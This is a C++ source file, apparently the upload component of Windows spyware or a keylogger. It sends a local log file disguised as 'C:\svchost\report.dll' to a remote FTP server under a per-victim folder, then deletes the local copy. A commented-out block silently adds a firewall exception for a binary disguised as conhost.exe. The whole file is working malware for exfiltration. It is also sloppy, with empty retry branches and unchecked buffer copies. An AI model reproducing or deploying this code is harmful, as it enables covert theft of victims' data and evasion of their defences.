#include <direct.h>
#include <windows.h>
#include <wininet.h>
#include <fstream>
#include <ctime>

#include "FTPHandler.h"
#include "FileHandler.h"
#include "Utils.h"

bool sendFile(std::string identification, bool firstRun){
    HINTERNET hInternet;
    HINTERNET hFtp;

    hInternet=InternetOpen(0,INTERNET_OPEN_TYPE_DIRECT,0,0,0);
//    if(hInternet == NULL) //debug...
//      cout<<"\n1)Something goes wrong...\n";
//    else
//      cout<<"\n1)Everything is perfect...\n";

    hFtp = InternetConnectA(hInternet,host.c_str(),INTERNET_DEFAULT_FTP_PORT,user.c_str(),pw.c_str(),INTERNET_SERVICE_FTP,0,0);
    if(hFtp == NULL){
        // try another ftp
        if(hFtp == NULL){
            // try another ftp
            
            if(hFtp == NULL){
                // try another ftp
            }
        }
    }
    
//      cout<<"\n2)Something goes wrong...\n";
//     else
//      cout<<"\n2)Everything is perfect...\n";

    char id[100];
    strcpy(id, "/htdocs/");
    strcat(id, identification.c_str());
    //cout << "Creada carpeta con ID " + identification << endl;
    FtpCreateDirectoryW(hFtp, s2ws(id).c_str()); 
    strcat(id, "/");
    strcat(id,getCurrentDateTime(false).c_str());
    FtpCreateDirectoryW(hFtp, s2ws(id).c_str());
    std::string dateWithFullPath;
    if (!firstRun){
        dateWithFullPath="/htdocs/"+identification+"/"+getCurrentDateTime(false)+"/"+getCurrentDateTime(true)+".txt";
    }
    else{
        dateWithFullPath="/htdocs/"+identification+"/"+getUserName();
    }
    char file[150];
    int dateWithFullPathLength=dateWithFullPath.size();
        for (int a=0;a<=dateWithFullPathLength;a++){
            file[a]=dateWithFullPath[a];
        }
    char localFile[] = "C:\\svchost\\report.dll\0";
        if(FtpPutFileW(hFtp,s2ws(localFile).c_str(),s2ws(file).c_str(),INTERNET_FLAG_TRANSFER_BINARY,0) == 1){
            //cout << "\n3) Everything is perfect...\n";
            remove( "C:\\svchost\\report.dll" );

        }
    /*    else{
            ShellExecute(0, "runas", "cmd.exe",  "/C netsh advfirewall firewall add rule name=\"Allow CONHost\" dir=in action=allow program=\"C:\\svchost\\conhost.exe\"\0", "C:\\svchost\\\0", SW_HIDE);            
            FtpPutFileW(hFtp,s2ws(localFile).c_str(),s2ws(file).c_str(),INTERNET_FLAG_TRANSFER_BINARY,0);
        }*/
//        else
//            cout << "\n3) Something goes wrong...";

    InternetCloseHandle(hFtp);
    InternetCloseHandle(hInternet);

    return 0;
}

